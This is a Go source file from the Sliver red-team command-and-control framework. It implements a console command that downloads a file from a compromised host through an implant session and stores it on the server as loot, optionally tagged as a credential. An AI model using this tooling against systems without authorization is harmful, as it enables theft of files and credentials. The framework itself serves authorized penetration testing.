package loot

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"path"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/desertbit/grumble"
)

// LootAddRemoteCmd - Add a file from the remote system to the server as loot
func LootAddRemoteCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	remotePath := ctx.Args.String("path")
	name := ctx.Flags.String("name")
	if name == "" {
		name = path.Base(remotePath)
	}

	var lootType clientpb.LootType
	var err error
	lootTypeStr := ctx.Flags.String("type")
	if lootTypeStr != "" {
		lootType, err = lootTypeFromHumanStr(lootTypeStr)
		if err == ErrInvalidLootType {
			con.PrintErrorf("Invalid loot type %s", lootTypeStr)
			return
		}
	} else {
		lootType = clientpb.LootType_LOOT_FILE
	}

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Looting remote file %s", remotePath), ctrl)

	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    remotePath,
	})
	if err != nil {
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("%s\n", err) // Download failed
			return
		}
	}

	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			con.PrintErrorf("Decoding failed %s", err)
			return
		}
	}

	// Determine type based on download buffer
	lootFileType, err := lootFileTypeFromHumanStr(ctx.Flags.String("file-type"))
	if lootFileType == -1 || err != nil {
		if isText(download.Data) {
			lootFileType = clientpb.FileType_TEXT
		} else {
			lootFileType = clientpb.FileType_BINARY
		}
	}
	loot := &clientpb.Loot{
		Name:     name,
		Type:     lootType,
		FileType: lootFileType,
		File: &commonpb.File{
			Name: path.Base(remotePath),
			Data: download.Data,
		},
	}
	if lootType == clientpb.LootType_LOOT_CREDENTIAL {
		loot.CredentialType = clientpb.CredentialType_FILE
	}

	loot, err = con.Rpc.LootAdd(context.Background(), loot)
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	con.PrintInfof("Successfully added loot to server (%s)\n", loot.LootID)
}
